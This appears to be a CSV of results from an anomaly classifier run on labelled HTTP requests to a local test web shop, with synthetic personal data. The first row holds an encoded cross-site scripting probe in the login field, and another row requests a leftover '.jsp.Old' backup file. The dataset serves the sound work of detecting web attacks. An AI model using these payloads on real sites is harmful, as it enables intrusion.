Prediction, Actual, Confidence, Method, Content, URL
1, 1, 100.00%, POST, modo=registro&login=mitsuiparos%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&password=d2S3O1nil2ar&nombre=Tea&apellidos=Cabrera+Noguera&email=holzer-hammersley4%40discon.in&dni=21034297S&direccion=Guadamacil%2C+198%2C+&ciudad=Torrejoncillo&cp=08779&provincia=Teruel&ntc=4706372444418662&B1=Registrar, http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
0, 0, 99.88%, GET, , http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1
1, 1, 92.21%, POST, modo=registro&login=perrotta4&password=-fortificaci%F3n&nombreA=Temistocles&apellidos=Bastidas+Lacruz&email=butch%407horas.coop&dni=64652659G&direccion=Calle+Cristo+86%2C+2G&ciudad=Berrocalejo+de+Aragona&cp=10520&provincia=Girona&ntc=8239878600110127&B1=Registrar, http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
0, 0, 63.97%, POST, modo=registro&login=raab&password=ac6%EDdi9o&nombre=Thal%EDa&apellidos=Albornoz+Quiva&email=heldabrand5%40chevrolet-volt.bg&dni=11738063J&direccion=C%2F+Otumba%2C+132%2C+&ciudad=Carataunas&cp=43791&provincia=Cuenca&ntc=8400067402160298&B1=Registrar, http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
1, 1, 97.91%, GET, , http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=libbey&pwd=141c1U01&remember=on&B1A=Entrar HTTP/1.1
1, 1, 82.22%, POST, modo=entrar&login=raymund&pwd=pist%F3n&remember=on&B1=%253F, http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
0, 0, 99.47%, GET, , http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1
0, 0, 99.95%, GET, , http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1
1, 1, 100.00%, GET, , http://localhost:8080/tienda1/6909030637832563290.jsp.Old HTTP/1.1
1, 1, 91.06%, POST, id=3%2F&nombre=Vino+Rioja&precio=39&cantidad=90&B1=A%F1adir+al+carrito, http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
